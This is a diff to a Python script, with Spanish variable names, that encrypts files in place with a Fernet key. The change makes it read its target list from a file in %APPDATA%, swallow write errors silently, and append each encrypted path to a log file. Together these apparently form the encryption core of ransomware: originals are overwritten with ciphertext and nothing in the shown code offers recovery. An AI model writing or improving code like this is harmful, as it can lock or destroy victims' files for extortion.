@@ -15,7 +15,14 @@ with open(ruta_clave, "rb") as clave_archivo:
 
 fernet = Fernet(clave)
 
-archivos = sys.argv[1].split(",")
+temp_dir = os.path.expandvars(r"%APPDATA%")
+file_path=os.path.join(temp_dir, "allfiles.txt")
+if sys.argv[1] == file_path:
+    with open(file_path, 'r') as f:
+      archivos = f.read().strip().split(',')
+      print(archivos)
+else:
+    archivos = sys.argv[1].strip().split(",")
 
 for archivo in archivos:
     if os.path.exists(archivo):  
@@ -23,17 +30,18 @@ for archivo in archivos:
             datos = file.read() 
 
         datos_encriptados = fernet.encrypt(datos)
+        try:
+          with open(archivo, "wb") as file:
+             file.write(datos_encriptados)
+        except:
+          pass
 
-        with open(archivo, "wb") as file:
-            file.write(datos_encriptados)
-
-        print(f"The file ‘{archivo}’ has been successfully encrypted.")
+        print(f"Files has been successfully encrypted.")
         
         ruta_lista = os.path.join(temp_dir, "encrypted_files.txt")
 
-        with open(ruta_lista, "w") as lista_archivo:
+        with open(ruta_lista, "a") as lista_archivo:
             lista_archivo.write(f"{archivo}\n")
     else:
         print(f"File ‘{archivo}’ does not exist.")
-
 
